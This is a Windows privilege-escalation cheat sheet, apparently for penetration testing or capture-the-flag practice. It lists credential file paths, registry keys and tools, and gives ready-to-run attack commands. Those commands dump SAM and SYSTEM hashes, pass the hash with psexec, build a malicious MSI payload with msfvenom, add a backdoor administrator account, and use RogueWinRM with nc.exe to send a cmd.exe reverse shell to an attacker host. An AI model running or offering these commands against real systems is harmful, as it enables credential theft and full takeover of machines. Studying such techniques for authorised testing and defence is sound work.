__________________________________
STATIC COMPILED BINARIES AND TOOLS

  https://github.com/ernw/static-toolbox/releases?q=&expanded=true
  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
  https://github.com/itm4n/PrivescCheck
  https://github.com/bitsadmin/wesng
  metasploit multi/recon/local_exploit_suggester

__________________________
USER PERMISSIONS HIERARCHY

  https://github.com/gtworek/Priv2Admin
  https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
  SYSTEM/LocalSystem
  Administrators
  Standard Users
  Local Service    (runs with "minimum" privileges, uses anonymous network creds)
  Network Service  (runs with "minimum" privileges, uses computer credentials for network auth)

_________________
USEFUL FILE PATHS

  Unattended installations:
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

  Internet Information Service (IIS) paths:
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 

____________________
USEFUL REGISTRY KEYS

  puTTY creds:           HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
  AlwaysInstallElevated: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
  AlwaysInstallElevated: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
  Services Configs:      HKLM\SYSTEM\CurrentControlSet\Services\
  SYSTEM hash:           HKLM\system
  SAM hash:              HKLM\sam

_______________________
USEFUL COMMANDS

  retrieve powershell history:
    from cmd:        type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    from powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

  find database connection strings from IIS:
    type [IIS PATH] | findstr connectionString

  check user privs:       whoami /priv
  list saved credentials: cmdkey /list
  run cmd as other user:  runas /savecred /user:admin cmd.exe
  get puTTY credentials:  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
  check scheduled tasks:  schtasks /fo list
  query individual task:  schtasks /query /tn "[TaskName]" /fo list /v
  check path permissions: icacls [PATH]
  grant permissions:      icacls [PATH] /grant [GROUP]:[PERMISSION]
  take ownership of file: takeown /f [PATH]
  stop/start service:     sc [stop/start] [SERVICE]
  show software:          wmic product get name,version,vendor

  backup SYSTEM hash:     reg save hklm\system C:\Users\[USER]\system.hive
  backup SAM hash:        reg save hklm\sam C:\Users\[USER]\sam.hive
  WinRM exploit:          RogueWinRM.exe -p [nc.exe] -a "-e cmd.exe [LHOST] [LPORT]" 
  add user and privesc:   net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add

  impacket scripts:
    share folder SMB server:python3.9 smbserver.py -smb2support -username [USERNAME] -password [PASSWORD] public [SHAREDFOLDERPATH]
    obtain hashes:          python3.9 secretsdump.py -sam sam.hive -system system.hive LOCAL
    pass the hash attack:   python3.9 psexec.py -hashes [HASH] [USERNAME]@[RHOST]

  For exploiting AlwaysInstallElevated (both bits should be set):
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    If both are set, generate a malicious .msi payload:
      msfvenom -p [PAYLOAD] LHOST=[LHOST] LPORT=[LPORT] -f msi -o [OUTFILE]

  
__________
TECHNIQUES

  Check powershell/database connection/saved credential histories for user creds.

  Check scheduled tasks and query them to see if their executables are writeable,
  or if they can fall victim to an unquoted service path vulnerability.

  Unquoted service paths (found in the BINARY_PATH_NAME of 
  "sc.exe qc [SERVICE]" command outputs) can be exploited if
  spaces exist in the path (ex. C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe)
  and the parent folder (for this example, C:\MyPrograms\) allows your user to write
  to it. Exploit by making an executable with a name that would be executed before
  the full path name and place it in the vulnerable directory (ex. C:\MyPrograms\Disk.exe)

  If a service allows you to modify service configurations, one may
  change the executable the service points to.
    check permissions using
      https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 
      usage: accesschk64.exe -qlc [SERVICE] 
    change permissions with
      sc config [SERVICE] binPath=[PATH] obj=LocalSystem

  Se Privilege attacks:
    Run cmd/ps with admin privs and check "whoami /priv" to check for privileges

    SeBackup/SeRestore:
      Backup SAM and SYSTEM hashes
      Use impacket SMB server to create shared folder, transfer hash files to attacker
      Use impacket secretsdump.py to retrieve password hashes

    SeTakeOwnership:
      Take ownership of a System owned file (ex. utilman.exe)
      Grant self elevated privileges over the file
      Replace with malicious binary

    SeImpersonate/SeAssignPrimaryToken:
      LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have this privilege assigned.
      Internet Information Services (IIS) has a similar default account called
      "iisapppool\defaultapppool" for webapps.

      This attack requires the ability to spawn a process that users will connect 
      and authenticate to, and it requires that existing users authenticate to it.
      One method would be compromising a website running on IIS and using a webshell
      through it. One may then use another exploit, like RogueWinRM to complete
      the privilege exploit.

      RogueWinRM:
        Whenever a user (including unprivileged) starts the BITS service, it automatically
        creates a connection to port 5985 using SYSTEM privs. This port is usually reserved
        for the WinRM service which is used to expose a Powershell console for remote use
        through the network (like SSH but powershell).

        If the WinRM service isn't running on the victim server, we may spawn a fake WinRM
        service, catch the authetication made to the BITS service when starting. If the user
        spawning the fake service has SeImpersonate privileges, they can impersonate the user
        connecting to the service, which in this case is SYSTEM. 
      
